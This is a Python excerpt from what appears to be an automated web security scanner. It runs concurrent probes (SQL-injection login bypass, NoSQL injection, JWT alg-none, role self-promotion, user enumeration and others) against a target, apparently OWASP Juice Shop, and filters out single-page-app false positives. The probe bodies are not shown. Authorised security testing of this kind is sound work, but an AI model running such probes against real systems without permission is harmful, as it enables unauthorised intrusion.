async def _fetch_baseline_body(session: aiohttp.ClientSession, base: str) -> str:
    """Fetch the SPA index so probes can tell unknown-path-fallback responses
    from real endpoints. Modern SPAs serve index.html for any unmatched path,
    which makes naive 'GET /foo returned 200' checks worthless.
    """
    _, _, body = await _get(session, base + "/")
    return body[:4000]


def _is_spa_shell(body: str, baseline: str) -> bool:
    """True if body is the SPA shell (matches baseline closely or has
    obvious SPA signatures + no API content).
    """
    if not body:
        return False
    # Cheap exact-prefix match: SPA shell is identical for every unknown path.
    if baseline and body[:2000] == baseline[:2000]:
        return True
    spa_markers = ("<app-root", "<base href", "<title>OWASP Juice Shop", "<meta name=\"theme-color\"")
    return any(m in body[:4000] for m in spa_markers) and "{" not in body[:200]


async def run_all_probes(
    target: str, js_urls: list[str] | None = None
) -> list[dict[str, Any]]:
    """Run every probe and return aggregated findings.

    Caller is responsible for tagging engagement_id and persisting via DB.
    """
    base = _normalize_base(target)
    js_urls = js_urls or []
    connector = aiohttp.TCPConnector(limit=4, force_close=True)
    async with aiohttp.ClientSession(
        connector=connector,
        headers={"User-Agent": _USER_AGENT},
    ) as session:
        baseline = await _fetch_baseline_body(session, base)
        results = await asyncio.gather(
            probe_open_redirect(session, base),
            probe_user_enum(session, base),
            probe_jwt_alg_none(
                session, base,
                ["/api/Users/", "/rest/admin/application-configuration", "/rest/user/whoami"],
            ),
            probe_source_maps(session, base, js_urls),
            probe_directory_listing(session, base),
            probe_dev_interfaces(session, base),
            probe_login_sqli_bypass(session, base),
            probe_role_self_promote(session, base),
            probe_ftp_leak(session, base),
            probe_nosql_inject(session, base),
            return_exceptions=True,
        )
    findings: list[dict[str, Any]] = []
    for r in results:
        if isinstance(r, list):
            findings.extend(r)
        elif isinstance(r, Exception):
            logger.warning("probe failed: %s", r)

    # Drop findings whose evidence body matches the SPA shell. These are false
    # positives where the SPA's default route returned index.html for an
    # unknown path, not a real debug/admin endpoint.
    filtered: list[dict[str, Any]] = []
    for f in findings:
        try:
            ev = json.loads(f.get("evidence", "{}"))
        except (TypeError, ValueError):
            ev = {}
        sample = ev.get("body_sample", "")
        if _is_spa_shell(sample, baseline):
            logger.info(
                "spa_probe: dropping SPA-shell false positive: %s", f.get("title")
            )
            continue
        filtered.append(f)
    return filtered
